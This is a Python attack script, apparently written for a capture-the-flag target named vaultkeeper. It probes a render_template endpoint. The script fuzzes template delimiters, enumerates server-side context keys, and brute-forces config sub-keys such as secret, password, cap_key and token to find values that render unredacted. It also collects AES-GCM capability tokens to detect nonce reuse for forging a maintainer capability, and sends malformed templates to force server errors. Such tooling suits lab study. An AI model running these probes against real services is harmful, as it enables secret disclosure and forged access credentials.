#!/usr/bin/env python3
"""
One decisive pass over the vaultkeeper stage-C leads. ~40 requests, paced.

T1  full render_template JSON, every field
T2  context-key enumeration through the response's `tokens` field
T3  AES-GCM nonce reuse across vk_cap_issue call sites
T4  whether a render throw is a whole-response 500

Usage: ctf-python slot_probe.py --base http://<host>
"""
import argparse
import base64
import json
import pathlib
import time

import requests

VK_CAP_IV = bytes.fromhex("9f1c0042a7335188200de4bb")
S = requests.Session()
S.headers["User-Agent"] = "vk-probe"


def rt(base, template, event="restore.failed", raw=False):
    """POST render_template, return the parsed JSON (or the status + text)."""
    for _ in range(3):
        try:
            r = S.post(base + "/api/render_template.php",
                       json={"template": template, "event": event}, timeout=25)
            return (r.status_code, r.json()) if not raw else (r.status_code, r.text)
        except Exception:
            time.sleep(1.5)
    return (0, None)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    a = ap.parse_args()
    base = a.base.rstrip("/")
    out = {}

    # ---- T0: which delimiter does this build use? --------------------------
    delim = None
    for lo, hi in (("[[", "]]"), ("{{", "}}"), ("<%", "%>"), ("${", "}")):
        _, j = rt(base, lo + "node" + hi, "maintenance.probe")
        if (j or {}).get("rendered") == "node-a":
            delim = (lo, hi)
            break
        time.sleep(0.15)
    if delim is None:
        raise SystemExit("[-] no known delimiter renders `node`; re-fuzz first")
    lo, hi = delim
    print("[T0] delimiter %s %s" % delim)

    def tok(inner):
        return lo + inner + hi

    # ---- T1: the complete response object, not just `rendered` -------------
    code, j = rt(base, tok("node"), "maintenance.probe")
    print("[T1] status", code)
    print("[T1] full body:", json.dumps(j, indent=2)[:1200])
    out["T1"] = j
    baseline_keys = sorted((j or {}).keys())
    time.sleep(0.2)

    # ---- T2: enumerate context keys via `tokens` ---------------------------
    # `tokens` is array_keys($ctx). Anything beyond the 8 base keys is new
    # context, and only the mask itself is on the redaction list, so a new key
    # holding key-derived material renders in the clear.
    prefixes = [
        "restore.failed", "maintenance.x", "vault.x", "seal.x", "cap.x",
        "key.x", "keyring.x", "unseal.x", "admin.x", "debug.x", "diag.x",
        "internal.x", "operator.x", "maintainer.x", "system.x", "checkpoint.x",
        "appliance.x", "node.x", "cluster.x", "support.x", "service.x",
        "backup.x", "snapshot.x", "audit.x", "config.x", "secret.x",
        "maintenance.debug", "maintenance.internal", "maintenance.full",
        "maintenance.cap", "maintenance.key", "maintenance.seal",
    ]
    seen = {}
    for p in prefixes:
        code, j = rt(base, "", p)
        toks = tuple((j or {}).get("tokens") or [])
        seen.setdefault(toks, []).append(p)
        extra = sorted(set((j or {}).keys()) - set(baseline_keys))
        if extra:
            print("[T2] %-22s EXTRA RESPONSE FIELDS %s" % (p, extra))
        time.sleep(0.15)
    print("[T2] distinct context shapes:")
    for toks, ps in seen.items():
        print("     %-70s <- %s" % (",".join(toks), ps[:4]))
    out["T2"] = {",".join(k): v for k, v in seen.items()}

    # probe every context key that is not one of the eight known ones
    known = {"event", "appliance", "node", "job", "source", "status", "when",
             "workspace", "config"}
    novel = set()
    for toks in seen:
        novel |= set(toks) - known
    if novel:
        print("[T2] NOVEL CONTEXT KEYS:", sorted(novel))
        for k in sorted(novel):
            ev = seen_prefix(seen, k)
            for tpl in (tok(k), tok(k + "|len")):
                print("     %-24s -> %r" % (tpl, rt(base, tpl, ev)[1].get("rendered")))
                time.sleep(0.15)
    out["T2_novel"] = sorted(novel)

    # ---- T2b: brute the sub-keys of `config` -------------------------------
    # resolve() returns an UNTAINTED '' for a path that doesn't exist, so an
    # empty render means absent and anything else means present. Only the mask
    # is on the redaction list, so a present key that isn't the mask renders
    # its value in the clear.
    subkeys = ("cap_mask cap_key capkey key mask secret seal seal_key token "
               "token_secret iv nonce salt pepper hmac sig signature cert priv "
               "private public passphrase password pass pw creds credential "
               "retention_days cluster_node version build revision commit "
               "release channel env environment debug verbose trace flag "
               "flag_path root path home dir tmp upload store db dsn user "
               "hostname fqdn ip port scheme proto uuid id serial licence "
               "license fingerprint checksum digest hash entropy seed rand "
               "unseal unseal_ref ref slot scope role rank caps capabilities"
               ).split()
    present = {}
    for k in subkeys:
        code, j = rt(base, tok("config." + k), "maintenance.x")
        v = (j or {}).get("rendered")
        if v:
            present[k] = v
            print("[T2b] config.%-16s -> %r" % (k, v))
        time.sleep(0.15)
    print("[T2b] present sub-keys:", sorted(present))
    unredacted = {k: v for k, v in present.items() if v != "[redacted]"}
    if set(unredacted) - {"retention_days", "cluster_node", "version"}:
        print("[T2b] *** UNEXPECTED CLEARTEXT CONFIG VALUE ***", unredacted)
    out["T2b"] = present

    # ---- T3: GCM nonce reuse ----------------------------------------------
    caps = []
    for i in range(2):
        try:
            r = S.get(base + "/api/status.php", timeout=20).json()
            caps.append(("status/viewer", r.get("read_capability")))
        except Exception as e:
            print("[T3] status err", e)
        time.sleep(0.2)
    for i in range(2):
        try:
            r = S.post(base + "/api/request_restore.php",
                       json={"source_label": "probe-%d" % i}, timeout=20).json()
            caps.append(("request_restore/guest", r.get("cap")))
        except Exception as e:
            print("[T3] restore err", e)
        time.sleep(0.2)
    nonces = []
    for src, c in caps:
        if not c:
            continue
        raw = base64.b64decode(c)
        n, ct, tag = raw[:12], raw[12:28], raw[28:44]
        nonces.append(n)
        print("[T3] %-24s nonce=%s ct=%s tag=%s" % (src, n.hex(), ct.hex(), tag.hex()))
    print("[T3] distinct nonces: %d of %d" % (len(set(nonces)), len(nonces)))
    if len(set(nonces)) < len(nonces):
        print("[T3] *** NONCE REUSE -> forbidden attack, forge a maintainer cap ***")
    if VK_CAP_IV in nonces:
        print("[T3] *** nonce == VK_CAP_IV constant ***")
    out["T3"] = [(s, c) for s, c in caps]

    # ---- T4: is a render throw a whole-response 500? -----------------------
    # `{{1/0}}` is the handout control: on the handout build it must be a 500,
    # which proves the 500-on-throw path exists in this codebase family.
    throwers = ["1/0", "#", "'unterminated", "node|", "|",
                "node|slice:a", "node|char|char|char",
                "node|len|mul:99999999999999999999999|char"]
    for tpl in [tok(t) for t in throwers]:
        code, txt = rt(base, tpl, "maintenance.x", raw=True)
        print("[T4] %-22s -> HTTP %s %s" % (tpl, code, txt[:160].replace("\n", " ")))
        time.sleep(0.15)

    with open(pathlib.Path(__file__).resolve().parent.parent / "artifacts" / "slot_probe.json", "w") as f:
        json.dump(out, f, indent=2, default=str)
    print("[+] wrote slot_probe.json")


def seen_prefix(seen, key):
    for toks, ps in seen.items():
        if key in toks:
            return ps[0]
    return "maintenance.x"


if __name__ == "__main__":
    main()
